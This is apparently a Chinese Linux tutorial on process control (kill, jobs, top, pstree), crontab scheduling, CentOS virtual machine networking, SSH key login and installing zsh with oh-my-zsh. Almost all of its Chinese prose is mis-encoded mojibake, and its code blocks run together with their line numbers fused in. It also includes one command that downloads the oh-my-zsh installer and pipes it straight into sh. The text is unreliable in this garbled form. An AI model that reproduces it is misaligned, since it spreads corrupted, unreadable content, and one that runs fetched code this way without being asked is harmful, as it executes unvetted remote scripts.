å‘½ä»¤æœ‰æ—¶å€™æŸä¸ªè¿›ç¨‹å¯èƒ½ä¼šé•¿æœŸå ç”¨CPUèµ„æºæˆ–æ— æ³•æ­£å¸¸æ‰§è¡Œæˆ–è¶…å‡ºè¿è¡Œæ—¶é—´ç­‰ï¼Œæ­¤æ—¶å¯èƒ½å¸Œæœ›äººå·¥å¹²é¢„ç›´æ¥å°†è¿›ç¨‹æ€æ­»ï¼Œè¿™æ—¶å€™killå‘½ä»¤å¯ä»¥æ´¾ä¸Šç”¨åœº 12341ã€kill pid ç›´æ¥æ€æ­»è¿›ç¨‹ï¼Œä½†ä¸èƒ½ä¿è¯ä¸€å®šèƒ½æ€æ­»2ã€kill -9 pid å¼ºåˆ¶æ€æ­»è¿›ç¨‹3ã€pidofå‘½ä»¤ç”¨äºæŸ¥çœ‹æŸä¸ªè¿›ç¨‹çš„è¿›ç¨‹å·ï¼ˆä¾‹å¦‚ï¼špidof mysqldï¼‰4ã€pkillå‘½ä»¤å¯ä»¥æŒ‰ç…§è¿›ç¨‹åæ€æ­»è¿›ç¨‹ã€‚pkillå’Œkillallåº”ç”¨æ–¹æ³•å·®ä¸å¤šï¼Œä¹Ÿæ˜¯ç›´æ¥æ€æ­»è¿è¡Œä¸­çš„ç¨‹åºï¼›å¦‚æœæ‚¨æƒ³æ€æ‰å•ä¸ªè¿›ç¨‹ï¼Œè¯·ç”¨killæ¥æ€æ‰ 3. è¿›ç¨‹åˆ‡æ¢å‰å°è¿›ç¨‹æŒ‡çš„æ˜¯è¿›ç¨‹åœ¨æ‰§è¡Œæ—¶ä¼šå°†å‘½ä»¤è¡Œé˜»å¡ï¼Œç›´åˆ°è¿›ç¨‹æ‰§è¡Œå®Œæ¯•ï¼›åå°è¿›ç¨‹æŒ‡çš„æ˜¯è¿›ç¨‹åœ¨æ‰§è¡Œæ—¶ä¸ä¼šé˜»å¡å½“å‰å‘½ä»¤è¡Œï¼Œè€Œæ˜¯åœ¨ç³»ç»Ÿåå°æ‰§è¡Œ 123451ã€ctrl + c ç»ˆæ­¢è¿›ç¨‹2ã€ctrl + z æŒ‚èµ·è¿›ç¨‹3ã€fgå‘½ä»¤å°†è¿›ç¨‹è½¬æ¢åˆ°å‰å°æ‰§è¡Œ4ã€bgå‘½ä»¤å°†è¿›ç¨‹è½¬æ¢åˆ°åå°æ‰§è¡Œ5ã€jobså‘½ä»¤æŸ¥çœ‹ä»»åŠ¡ 4. topå‘½ä»¤top å‘½ä»¤å¯ä»¥å®šæœŸæ˜¾ç¤ºæ‰€æœ‰æ­£åœ¨è¿è¡Œå’Œå®é™…è¿è¡Œå¹¶ä¸”æ›´æ–°åˆ°åˆ—è¡¨ä¸­ï¼Œå®ƒæ˜¾ç¤ºå‡º CPU çš„ä½¿ç”¨ã€å†…å­˜çš„ä½¿ç”¨ã€äº¤æ¢å†…å­˜ã€ç¼“å­˜å¤§å°ã€ç¼“å†²åŒºå¤§å°ã€è¿‡ç¨‹æ§åˆ¶ã€ç”¨æˆ·å’Œæ›´å¤šå‘½ä»¤ã€‚å®ƒä¹Ÿä¼šæ˜¾ç¤ºå†…å­˜å’Œ CPU ä½¿ç”¨ç‡è¿‡é«˜çš„æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚ æŒ‰qé”®é€€å‡ºæŸ¥çœ‹. 5. pstreeå‘½ä»¤å°†è¿›ç¨‹é—´çš„å…³ç³»ä»¥æ ‘ç»“æ„çš„å½¢å¼å±•ç¤ºï¼Œèƒ½æ¸…æ¥šçœ‹å„è¿›ç¨‹ä¹‹é—´çš„çˆ¶å­å…³ç³» 12pstree ï¼šä»¥æ ‘çŠ¶å½¢å¼æ˜¾ç¤ºè¿›ç¨‹pstree -p ï¼š ä»¥æ ‘çŠ¶å½¢å¼æ˜¾ç¤ºè¿›ç¨‹ï¼Œå¹¶ä¸”æ˜¾ç¤ºè¿›ç¨‹å· 6. JPSå‘½ä»¤JPSå‘½ä»¤æ˜¯JDKæä¾›çš„ä¸€ä¸ªæ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å¯åŠ¨äº†JVMè¿›ç¨‹çš„ä¸€ä¸ªè¿›ç¨‹ã€‚ä¸æ˜¯linuxç³»ç»Ÿè‡ªå¸¦çš„ã€‚ä¸»è¦ä»»åŠ¡å°±æ˜¯ç”¨æ¥æ£€æŸ¥javaè¿›ç¨‹çš„ã€‚ 7. è®¡åˆ’ä»»åŠ¡æ¦‚å¿µè®¡åˆ’ä»»åŠ¡åœ¨Linuxçš„ä½“ç°ä¸»è¦åˆ†ä¸ºatå’Œcrontabï¼Œå…¶ä¸­ï¼š atï¼šé€šè¿‡atå‘½ä»¤å®‰æ’ä»»åŠ¡åœ¨æŸä¸€æ—¶åˆ»æ‰§è¡Œä¸€æ¬¡ crontabï¼šé€šè¿‡crontab å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å›ºå®šçš„é—´éš”æ—¶é—´æ‰§è¡ŒæŒ‡å®šçš„ç³»ç»ŸæŒ‡ä»¤æˆ– shell scriptè„šæœ¬ã€‚æ—¶é—´é—´éš”çš„å•ä½å¯ä»¥æ˜¯åˆ†é’Ÿã€å°æ—¶ã€æ—¥ã€æœˆã€å‘¨åŠä»¥ä¸Šçš„ä»»æ„ç»„åˆã€‚è¿™ä¸ªå‘½ä»¤éå¸¸é€‚åˆå‘¨æœŸæ€§çš„æ—¥å¿—åˆ†ææˆ–æ•°æ®å¤‡ä»½ç­‰å·¥ä½œã€‚ å‘½ä»¤æœåŠ¡ç®¡ç†crontabåœ¨CentOSç³»ç»Ÿä¸Šï¼ŒcrontabæœåŠ¡çš„åç§°å«åšcrond å®‰è£… yum -y install crontabs æœåŠ¡æ“ä½œè¯´æ˜ 1234567891011service crond start #å¯åŠ¨æœåŠ¡service crond stop #å…³é—­æœåŠ¡service crond restart #é‡å¯æœåŠ¡service crond reload #é‡æ–°è½½å…¥é…ç½®service crond status #æœåŠ¡çŠ¶æ€#æŸ¥çœ‹crontabæœåŠ¡æ˜¯å¦å·²è®¾ç½®ä¸ºå¼€æœºå¯åŠ¨ï¼Œæ‰§è¡Œå‘½ä»¤ï¼šchkconfig --list#åŠ å…¥å¼€æœºè‡ªåŠ¨å¯åŠ¨ï¼šchkconfig --level 35 crond on crontabåŠŸèƒ½ä½¿ç”¨ å‘½ä»¤æ ¼å¼ 123456789101112131415161718192021222324252627282930313233crontab [-u user] filecrontab [-u user] [ -e | -l | -r ]# crontab å‚æ•°è¯´æ˜ï¼š-u userï¼šç”¨æ¥è®¾å®šæŸä¸ªç”¨æˆ·çš„crontabæœåŠ¡ï¼Œä¾‹å¦‚ï¼Œâ€-u ixdbaâ€è¡¨ç¤ºè®¾å®šixdbaç”¨æˆ·çš„crontabæœåŠ¡ï¼Œæ­¤å‚æ•°ä¸€èˆ¬æœ‰rootç”¨æˆ·æ¥è¿è¡Œã€‚fileï¼šfileæ˜¯å‘½ä»¤æ–‡ä»¶çš„åå­—,è¡¨ç¤ºå°†fileåšä¸ºcrontabçš„ä»»åŠ¡åˆ—è¡¨æ–‡ä»¶å¹¶è½½å…¥crontabã€‚-eï¼šç¼–è¾‘æŸä¸ªç”¨æˆ·çš„crontabæ–‡ä»¶å†…å®¹ã€‚å¦‚æœä¸æŒ‡å®šç”¨æˆ·ï¼Œåˆ™è¡¨ç¤ºç¼–è¾‘å½“å‰ç”¨æˆ·çš„crontabæ–‡ä»¶ã€‚-lï¼šæ˜¾ç¤ºæŸä¸ªç”¨æˆ·çš„crontabæ–‡ä»¶å†…å®¹ï¼Œå¦‚æœä¸æŒ‡å®šç”¨æˆ·ï¼Œåˆ™è¡¨ç¤ºæ˜¾ç¤ºå½“å‰ç”¨æˆ·çš„crontabæ–‡ä»¶å†…å®¹ã€‚-rï¼šåˆ é™¤å®šæ—¶ä»»åŠ¡é…ç½®ï¼Œä»/var/spool/cronç›®å½•ä¸­åˆ é™¤æŸä¸ªç”¨æˆ·çš„crontabæ–‡ä»¶ï¼Œå¦‚æœä¸æŒ‡å®šç”¨æˆ·ï¼Œåˆ™é»˜è®¤åˆ é™¤å½“å‰ç”¨æˆ·çš„crontabæ–‡ä»¶ã€‚-iï¼šåœ¨åˆ é™¤ç”¨æˆ·çš„crontabæ–‡ä»¶æ—¶ç»™ç¡®è®¤æç¤ºã€‚# å‘½ä»¤ç¤ºä¾‹ï¼šcrontab file [-u user] ## ç”¨æŒ‡å®šçš„æ–‡ä»¶æ›¿ä»£ç›®å‰çš„crontabã€‚ # å¿…é¡»æŒæ¡ï¼šcrontab -l [-u user] ## åˆ—å‡ºç”¨æˆ·ç›®å‰çš„crontab. crontab -e [-u user] ## ç¼–è¾‘ç”¨æˆ·ç›®å‰çš„crontab.# é€šè¿‡crontabæ·»åŠ çš„è®¡åˆ’ä»»åŠ¡éƒ½ä¼šå­˜å‚¨åœ¨/var/spool/cron/ç›®å½•é‡Œ# æŸ¥çœ‹å½“å‰æœåŠ¡çŠ¶æ€service crond status# æ“ä½œæœåŠ¡/sbin/service crond start //å¯åŠ¨æœåŠ¡/sbin/service crond stop //å…³é—­æœåŠ¡/sbin/service crond restart //é‡å¯æœåŠ¡/sbin/service crond reload //é‡æ–°è½½å…¥é…ç½®# æŸ¥çœ‹å¼€æœºå¯åŠ¨æœåŠ¡ntsysv # é€€å‡ºæ—¶, æŒ‰tabåˆ‡æ¢# åŠ å…¥å¼€æœºè‡ªåŠ¨å¯åŠ¨chkconfig â€“level 35 crond on é…ç½®è¯´æ˜ 123456789101112131415161718# åŸºæœ¬æ ¼å¼ : * * * * * command åˆ† æ—¶ æ—¥ æœˆ å‘¨ å‘½ä»¤ # æ¯ä¸ªå°æ—¶çš„ç¬¬å‡ åˆ†é’Ÿæ‰§è¡Œè¯¥ä»»åŠ¡. å…¶å®ƒçš„ç±»ä¼¼ç¬¬1åˆ—è¡¨ç¤ºåˆ†é’Ÿ1ï½59 æ¯åˆ†é’Ÿç”¨*æˆ–è€… */1è¡¨ç¤º ç¬¬2åˆ—è¡¨ç¤ºå°æ—¶0ï½23ï¼ˆ0è¡¨ç¤º0ç‚¹ï¼‰ 7-9è¡¨ç¤ºï¼š8ç‚¹åˆ°10ç‚¹ä¹‹é—´ç¬¬3åˆ—è¡¨ç¤ºæ—¥æœŸ1ï½31 ç¬¬4åˆ—è¡¨ç¤ºæœˆä»½1ï½12 ç¬¬5åˆ—æ ‡è¯†å·æ˜ŸæœŸ0ï½6ï¼ˆ0è¡¨ç¤ºæ˜ŸæœŸå¤©ï¼‰ ç¬¬6åˆ—è¦è¿è¡Œçš„å‘½ä»¤# è®°ä½å‡ ä¸ªç‰¹æ®Šç¬¦å·çš„å«ä¹‰:â€œ*â€ä»£è¡¨å–å€¼èŒƒå›´å†…çš„æ•°å­—,â€œ/â€ä»£è¡¨â€æ¯â€,â€œ-â€ä»£è¡¨ä»æŸä¸ªæ•°å­—åˆ°æŸä¸ªæ•°å­—,â€œ,â€åˆ†å¼€å‡ ä¸ªç¦»æ•£çš„æ•°å­— é…ç½®ç¤ºä¾‹ 123456789101112131415161718192021222324252627282930313233# * * * * * command # åˆ† æ—¶ æ—¥ æœˆ å‘¨ å‘½ä»¤ */1 * * * * date &gt;&gt; /root/date.txtä¸Šé¢çš„ä¾‹å­è¡¨ç¤ºæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡dateå‘½ä»¤å¯ç”¨ tail -fæŸ¥çœ‹30 21 * * * /usr/local/etc/rc.d/httpd restartä¸Šé¢çš„ä¾‹å­è¡¨ç¤ºæ¯æ™šçš„21:30é‡å¯apache45 4 1,10,22 * * /usr/local/etc/rc.d/httpd restartä¸Šé¢çš„ä¾‹å­è¡¨ç¤ºæ¯æœˆ1ã€10ã€22æ—¥çš„4 : 45é‡å¯apache10 1 * * 6,0 /usr/local/etc/rc.d/httpd restart ä¸Šé¢çš„ä¾‹å­è¡¨ç¤ºæ¯å‘¨å…­ã€å‘¨æ—¥çš„1 : 10é‡å¯apache0,30 18-23 * * * /usr/local/etc/rc.d/httpd restartä¸Šé¢çš„ä¾‹å­è¡¨ç¤ºåœ¨æ¯å¤©18 : 00è‡³23 : 00ä¹‹é—´æ¯éš”30åˆ†é’Ÿé‡å¯apache0 23 * * 6 /usr/local/etc/rc.d/httpd restartä¸Šé¢çš„ä¾‹å­è¡¨ç¤ºæ¯æ˜ŸæœŸå…­çš„11 : 00 pmé‡å¯apache* */1 * * * /usr/local/etc/rc.d/httpd restartä¸Šé¢çš„ä¾‹å­æ¯ä¸€å°æ—¶é‡å¯apache* 23-7/1 * * * /usr/local/etc/rc.d/httpd restartä¸Šé¢çš„ä¾‹å­æ™šä¸Š11ç‚¹åˆ°æ—©ä¸Š7ç‚¹ä¹‹é—´ï¼Œæ¯éš”ä¸€å°æ—¶é‡å¯apache0 11 4 * mon-wed /usr/local/etc/rc.d/httpd restartä¸Šé¢çš„ä¾‹å­æ¯æœˆçš„4å·ä¸æ¯å‘¨ä¸€åˆ°å‘¨ä¸‰çš„11ç‚¹é‡å¯apache0 4 1 jan * /usr/local/etc/rc.d/httpd restart ä¸Šé¢çš„ä¾‹å­ä¸€æœˆä¸€å·çš„4ç‚¹é‡å¯apache æ›´è¯¦ç»†çš„è§è¿™é‡Œ 8. Linuxè™šæ‹Ÿä¸»æœºé›†ç¾¤æµ‹è¯•ç¯å¢ƒåŸºæœ¬æ­å»º æ³¨æ„ç‚¹: é¦–æ¬¡ä½¿ç”¨ NAT æ¨¡å¼è£…å¥½CentOSä¹‹å, ä½¿ç”¨ifconfigæŸ¥çœ‹ip, è™šæ‹Ÿæœºæ˜¯æ²¡æœ‰ipçš„, éœ€è¦æ‰‹åŠ¨å¼€å¯ipæœåŠ¡, å‘½ä»¤æ˜¯ dhclient, å¦‚æœå·²å¼€å¯å°±ä¸èƒ½å†æ¬¡å¼€å¯ 1. ç¬¬ä¸€å°è™šæ‹Ÿä¸»æœºçš„é™æ€ipé…ç½®(é’ˆå¯¹äºmacç¯å¢ƒ) æ‰§è¡Œifconfigå‘½ä»¤, å¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667shixuanji@x:~|â‡’ ifconfiglo0: flags=8049&lt;UP,LOOPBACK,RUNNING,MULTICAST&gt; mtu 16384 options=1203&lt;RXCSUM,TXCSUM,TXSTATUS,SW_TIMESTAMP&gt; inet 127.0.0.1 netmask 0xff000000 inet6 ::1 prefixlen 128 inet6 fe80::1%lo0 prefixlen 64 scopeid 0x1 nd6 options=201&lt;PERFORMNUD,DAD&gt;gif0: flags=8010&lt;POINTOPOINT,MULTICAST&gt; mtu 1280stf0: flags=0&lt;&gt; mtu 1280EHC29: flags=0&lt;&gt; mtu 0EHC26: flags=0&lt;&gt; mtu 0XHC20: flags=0&lt;&gt; mtu 0en0: flags=8823&lt;UP,BROADCAST,SMART,SIMPLEX,MULTICAST&gt; mtu 1500 ether 60:03:08:a1:ac:ee nd6 options=201&lt;PERFORMNUD,DAD&gt; media: autoselect (&lt;unknown type&gt;) status: inactivep2p0: flags=8802&lt;BROADCAST,SIMPLEX,MULTICAST&gt; mtu 2304 ether 02:03:08:a1:ac:ee media: autoselect status: inactiveawdl0: flags=8902&lt;BROADCAST,PROMISC,SIMPLEX,MULTICAST&gt; mtu 1484 ether 72:25:b2:c8:2a:03 nd6 options=201&lt;PERFORMNUD,DAD&gt; media: autoselect status: inactiveen1: flags=8963&lt;UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX,MULTICAST&gt; mtu 1500 options=60&lt;TSO4,TSO6&gt; ether 32:00:1a:0d:12:00 media: autoselect &lt;full-duplex&gt; status: inactiveen2: flags=8963&lt;UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX,MULTICAST&gt; mtu 1500 options=60&lt;TSO4,TSO6&gt; ether 32:00:1a:0d:12:01 media: autoselect &lt;full-duplex&gt; status: inactivebridge0: flags=8822&lt;BROADCAST,SMART,SIMPLEX,MULTICAST&gt; mtu 1500 options=63&lt;RXCSUM,TXCSUM,TSO4,TSO6&gt; ether 32:00:1a:0d:12:00 Configuration: id 0:0:0:0:0:0 priority 0 hellotime 0 fwddelay 0 maxage 0 holdcnt 0 proto stp maxaddr 100 timeout 1200 root id 0:0:0:0:0:0 priority 0 ifcost 0 port 0 ipfilter disabled flags 0x2 member: en1 flags=3&lt;LEARNING,DISCOVER&gt; ifmaxaddr 0 port 10 priority 0 path cost 0 member: en2 flags=3&lt;LEARNING,DISCOVER&gt; ifmaxaddr 0 port 11 priority 0 path cost 0 media: &lt;unknown type&gt; status: inactiveutun0: flags=8051&lt;UP,POINTOPOINT,RUNNING,MULTICAST&gt; mtu 2000 inet6 fe80::2ed8:c28:27b2:f5d2%utun0 prefixlen 64 scopeid 0xd nd6 options=201&lt;PERFORMNUD,DAD&gt;vmnet1: flags=8863&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500 ether 00:50:56:c0:00:01 inet 172.16.63.1 netmask 0xffffff00 broadcast 172.16.63.255vmnet8: flags=8863&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500 ether 00:50:56:c0:00:08 inet 192.168.170.1 netmask 0xffffff00 broadcast 192.168.170.255en4: flags=8863&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500 options=3&lt;RXCSUM,TXCSUM&gt; ether 00:0e:c6:cc:ae:d7 inet6 fe80::1c60:7fe2:3947:4ec0%en4 prefixlen 64 secured scopeid 0x11 inet 192.168.63.148 netmask 0xffffff00 broadcast 192.168.63.255 nd6 options=201&lt;PERFORMNUD,DAD&gt; media: autoselect (100baseTX &lt;full-duplex,flow-control&gt;) status: active æ‰¾åˆ°æœ€åçš„vmnet8, å…¶ä¸­çš„ inet å°±æ˜¯è™šæ‹Ÿä¸»æœºçš„ç½‘æ®µ, é…ç½®è™šæ‹Ÿä¸»æœºçš„é™æ€ipçš„æ—¶å€™, å°±é…ç½®æ­¤ç½‘æ®µå†…çš„. å¹¿æ’­åœ°å€ broadcastä¹Ÿæ˜¯è™šæ‹Ÿä¸»æœºNATçš„å¹¿æ’­åœ°å€, é…ç½®æ—¶å¯ä»¥ä¸å¡« 123vmnet8: flags=8863&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500 ether 00:50:56:c0:00:08 inet 192.168.170.1 netmask 0xffffff00 broadcast 192.168.170.255 ä¿®æ”¹è™šæ‹Ÿæœºç½‘å¡é…ç½®vi /etc/sysconfig/network-scripts/ifcfg-eth0, åšå¦‚ä¸‹é…ç½® 123456789101112DEVICE=eth0HWADDR=00:0C:29:D6:C7:0ETYPE=EthernetUUID=bebc1b63-4f20-405a-860a-32d0d8211582ONBOOT=yesNM_CONTROLLED=yesBOOTPROTO=static # ipç±»å‹IPADDR=192.168.170.6 # ipåœ°å€, ä¸ vmnet8 åœ¨åŒä¸€ç½‘æ®µNETMASK=255.255.255.0 # å­ç½‘æ©ç GATEWAY=192.168.170.2 # ç½‘å…³, è·Ÿ ipåœ¨åŒä¸€ç½‘æ®µDNS1=192.168.170.2 # ä¸ ip åŒä¸€ç½‘æ®µ DNS2=8.8.8.8 # googleçš„ dns é‡å¯ç½‘ç»œæœåŠ¡(è¿™é‡Œé‡å¯ä¹Ÿæ²¡å•¥ç”¨ï¼Œç­‰åé¢hostnameæ”¹å®Œäº†ï¼Œé‡å¯ä¸€ä¸‹) service network restart 2. å¤åˆ¶åŸæœ¬çš„è™šæ‹Ÿä¸»æœº å¤åˆ¶è™šæ‹Ÿä¸»æœº1åˆ°2 æŒ‰ç…§åŸè™šæ‹Ÿä¸»æœºçš„rootç”¨æˆ·å&amp;å¯†ç ç™»å½•2 3. ä¿®æ”¹æ–°æœºç½‘å¡ ä¿®æ”¹ç½‘å¡vi /etc/udev/rules.d/70-persistent-net.rules, åˆ é™¤eth0æ‰€åœ¨çš„æ•´ä¸ªæ®µè½, æŠŠä¸‹é¢çš„eth1æ”¹ä¸ºeth0, ä¿å­˜é€€å‡º ä¿®æ”¹ç½‘å¡é…ç½®vi /etc/sysconfig/network-scripts/ifcfg-eth0, å¦‚æœæœ‰UUID, HARDDR, åˆ æ‰, IPADDRæ”¹ä¸ºä¸åŸè™šæ‹Ÿä¸»æœºä¸åŒçš„åœ°å€, ä½†è¦åœ¨åŒä¸€ç½‘æ®µ, BOOTPROTOæ”¹ä¸ºstatic4. ä¿®æ”¹æ–°æœºhostname â€‹ ä¿®æ”¹hostname, vi /etc/sysconfig/network, æŠŠHOSTNAMEæ”¹ä¸ºè¦ä¿®æ”¹çš„åå­— 5.åˆ°è¿™é‡Œé…ç½®å®Œäº†ï¼Œé‡å¯ä¸€ä¸‹reboot 6. SSHå…å¯†ç™»å½•åŸç† æ³¨æ„ç‚¹ï¼šå¦‚æœé‡åˆ°éœ€è¦æ·»åŠ æ–°æœºå™¨ä¹‹ç±»çš„ï¼Œæœ€å¥½æ˜¯å…ˆæŠŠ .sshæ–‡ä»¶åˆ æ‰ï¼Œç„¶åæ‰€æœ‰çš„æœºå™¨ä¸€èµ·æ“ä½œçœ‹ï¼Œå…¨éƒ¨éƒ½é‡æ–°ç”Ÿæˆssh-keygenï¼Œ å…¨éƒ¨é‡æ–°å‘é€ ssh-copy-id ï¼Œè¿™æ ·æœ€ç®€å•ï¼Œä¸æ˜“å‡ºé”™ åœ¨macç«¯ï¼Œä¼ ssh-copy-idæ—¶å€™ï¼Œè¦åˆ¶å®šç”¨æˆ·å ssh-copy-id ap@cs1ï¼›ç±»ä¼¼è¿™æ · æ–°æœºç”Ÿæˆè‡ªå·±å…¬é’¥ ssh-keygen, æ³¨æ„: å¦‚æœåŸæœ¬ä¸»æœºä¸­å·²ç»ç”Ÿæˆ, æ­¤å¤„åœ¨æç¤ºverwrite (y/n)?çš„æ—¶å€™è¦é€‰æ‹©y, æ‰ä¼šé‡æ–°ç”Ÿæˆè¦†ç›– æŠŠæ–°ä¸»æœºå…¬é’¥å‘é€ç»™å…¶å®ƒæœºå™¨ ssh-copy-id root@xxx(å…¶å®ƒä¸»æœºip), æ­¤å‘½ä»¤ç›¸å½“äº ä¸‹é¢2æ¡å‘½ä»¤çš„æ•ˆæœ 12cat id_rsa.pub &gt; authorized_keysscp -r authorized_keys root@192.168.123.202:/root/.ssh/ å…¶ä»–ä¸»æœºä¹ŸæŠŠå…¬é’¥å‘ç»™æ–°ä¸»æœº, æ­¤æ—¶å°±å¯ä»¥å®ç°ä¸»æœºé—´çš„å…å¯†ç™»å½•äº†. 7. åŠŸèƒ½å¢å¼º(å¯é€‰) å¯ä»¥åœ¨ æ¯å°æœºå™¨ä¸­è®¾ç½®hoståˆ«å, vi /etc/hosts, åŠ ä¸Šxxx.xxx.xx.xxx cts1/2/3..., è¿™æ ·åœ¨è®¿é—®å…¶ä»–ä¸»æœºæ—¶, å¯ä»¥ç›´æ¥ç”¨åˆ«åæ›¿ä»£åŸŸå å¦‚æœæ˜¯ç”¨çš„zshçš„shell, å¯ä»¥åœ¨æ‰€æœ‰ä¸»æœºçš„ &lt;sub&gt;.zshrcä¸­, æ·»åŠ alias login1=&#39;ssh root@cts1&#39; &gt;&gt; &lt;/sub&gt;/.zshrc, è¿™æ ·å¯ä»¥ç›´æ¥ ç”¨ login1ç™»å½•åˆ°å¯¹åº”çš„ä¸»æœº. 9. å®‰è£…, ä½¿ç”¨ zsh &amp; oh-my-zsh &amp;ç›¸å…³æ’ä»¶ä¸»éª¨æ¶å®‰è£…&amp;ä»‹ç» å®‰è£…zshå¥—ä»¶ 1yum install zsh -y å®‰è£… oh-my-zshå¥—ä»¶ 1sh -c "$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)" zsh çš„ä¸€äº›åŸºæœ¬é…ç½®æ“ä½œ, å¸¸ç”¨æ’ä»¶å®‰è£…è§è¿™é‡Œ! 12345678910111213141516171819202122# æŸ¥çœ‹oh-my-zsh çš„ä¸»é¢˜ls ~/.oh-my-zsh/themes------#è¿™é‡Œéƒ½æ˜¯ .zshrcä¸­çš„é…ç½®------# å¯ä»¥æ›´æ”¹ä¸ºrandom, è¿™æ ·ä¼šéšæœºæ˜¾ç¤º, å¾ˆæœ‰ä¹è¶£, ç›´æ¥è¾“å…¥zshä¹Ÿä¼šåˆ‡æ¢vi ~/.zshrcZSH_THEME="random"# æ·»åŠ plugin, æŒ‰ç…§å¯¹åº”æ–¹å¼å®‰è£…plugins=(git ... ... )# æ·»åŠ alias åˆ° ~/.zshrcalias vi='vim'alias zshconfig='vi ~/.zshrc'alias vimconfig='vi ~/.vimrc'-----------------------# è®¾ç½®å½“å‰ç”¨æˆ·ä½¿ç”¨zshä¸ºé»˜è®¤çš„shellchsh -s /bin/zsh# å¸è½½ oh-my-zshuninstall_oh_my_zsh zsh zsh çš„ä¸€äº›éªšæ°”æ“ä½œ 12345671. å…¼å®¹ bash, è¿™ä¸ªå°±ä¸ç”¨è¯´äº†2. è¾“å…¥æŸæ¡å‘½ä»¤, æ¯”å¦‚ cat, ç„¶åç”¨ä¸Šä¸‹é”®, å¯ä»¥ç¿»é˜…æ‰€æœ‰æ‰§è¡Œè¿‡çš„å‘½ä»¤3. å„ç§è¡¥å…¨, è¾“å…¥ä»»ä½•å‘½ä»¤, æŒ‰ 2ä¸‹ tabé”®, ä¸‹é¢ä¼šå‡ºç°æ‰€æœ‰å¯èƒ½çš„è¡¥å…¨, å¯ä»¥ tab, æˆ– ä¸Šä¸‹å·¦å³åˆ‡æ¢.4. æ¯”å¦‚è¦æ€æ‰è¿›ç¨‹java, åŸæ¥æ˜¯éœ€è¦ ps aux | grep java, æŸ¥è¿›ç¨‹çš„ PIDï¼Œç„¶å kill PID; ç°åœ¨åªéœ€è¦ kill java, ç„¶åæŒ‰ä¸‹ tab, javaä¼šè¢«æ›¿æ¢ä¸º å¯¹åº”çš„ PID, ç‚¹å›è½¦, kill !5. ç›®å½•æµè§ˆå’Œè·³è½¬, è¾“å…¥ d, å¯ä»¥åˆ—å‡ºåœ¨è¿™ä¸ªå›è¯ä¸­è®¿é—®è¿‡çš„ç›®å½•åˆ—è¡¨, å†è¾“å…¥åˆ—è¡¨å‰çš„åºå·, å³å¯ç›´æ¥è·³è½¬.6. åœ¨å½“å‰ç›®å½•ä¸‹è¾“å…¥ .. æˆ– ... , æˆ–è€…ç›´æ¥è¾“å…¥ç›®å½•å, éƒ½å¯ä»¥ç›´æ¥è·³è½¬, ç”šè‡³éƒ½ä¸éœ€è¦ä½¿ç”¨ cdå‘½ä»¤äº†.7. é€šé…ç¬¦æœç´¢ï¼šls -l */.shï¼Œå¯ä»¥é€’å½’æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹çš„ shell æ–‡ä»¶ï¼Œæ–‡ä»¶å°‘æ—¶å¯ä»¥ä»£æ›¿ findï¼Œæ–‡ä»¶å¤ªå¤šå°±æ­‡èœäº†. zshä¸»é¢˜ä»‹ç», zshæ’ä»¶ä»‹ç» zshå¸¸ç”¨æ’ä»¶å®‰è£…å®‰è£… zsh-autosuggestions1234567891011121314151617181920æ–¹å¼1: # ä¸‹è½½åˆ°æœ¬åœ°git clone git://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions# æ·»åŠ åˆ°.zshrc, è¿™æ ·å°±ä¸ç”¨æ¯æ¬¡sourceäº†æ·»åŠ  source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh åˆ° .zshrc å°¾éƒ¨plugins=() ä¸­æ·»åŠ ä¸Š zsh-autosuggestions, ç”¨ç©ºæ ¼éš”å¼€å³å¯======================æ–¹å¼2: å®˜æ–¹å»ºè®®# å°‘äº†æ·»åŠ sourceåˆ° ~/.zshrcè¿™ä¸€æ­¥, çŒœæƒ³æ˜¯ä¼šæŒ‰ç…§é»˜è®¤çš„è·¯å¾„åŠ è½½? ==&gt; æ˜¯çš„, æ˜¯å¯è¡Œçš„, å»ºè®®è¿™ä¸ª# çŒœæƒ³, oh-my-zshä¼šè‡ªåŠ¨å¯¹å®‰è£…åˆ° &lt;sub&gt;/.oh-my-zsh/custom&#125;/plugins/ æ­¤è·¯å¾„ä¸‹çš„æ’ä»¶source, å°±ä¸éœ€è¦æ‰‹åŠ¨åœ¨ &lt;/sub&gt;/.zshrcä¸­æ·»åŠ sourceäº†, å…¶å®ƒçš„æ’ä»¶å°±å…ˆä¸æŠ˜è…¾äº†, ä»¥åæœ‰æœºä¼šå†è¯•è¯•# 1.Clone this repository into $ZSH_CUSTOM/plugins (by default ~/.oh-my-zsh/custom/plugins)git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions# 2.Add the plugin to the list of plugins for Oh My Zsh to load:plugins=(zsh-autosuggestions)# 3.Start a new terminal session. å®‰è£… autojump123456789101112131415161718# ä¸‹è½½åˆ°æœ¬åœ°git clone git://github.com/joelthelion/autojump.git# æ‰§è¡Œå®‰è£…è„šæœ¬cd autojump./install.py# å®‰è£…å®Œæˆåœ¨~/ä¸‹é¢æœ‰.autojumpç›®å½•, åœ¨.zshrcä¸­åŠ ä¸€å¥[[ -s &lt;sub&gt;/.autojump/etc/profile.d/autojump.sh ]] &amp;&amp; . &lt;/sub&gt;/.autojump/etc/profile.d/autojump.sh# åœ¨plugins=(git zsh-autosuggestions autojump) åŠ ä¸Šautojump, ä¸å‰è€…ç”¨ç©ºæ ¼éš”å¼€PS: æ·»åŠ ä¸€æ¡å¿«æ·é”®ï¼šj -a s 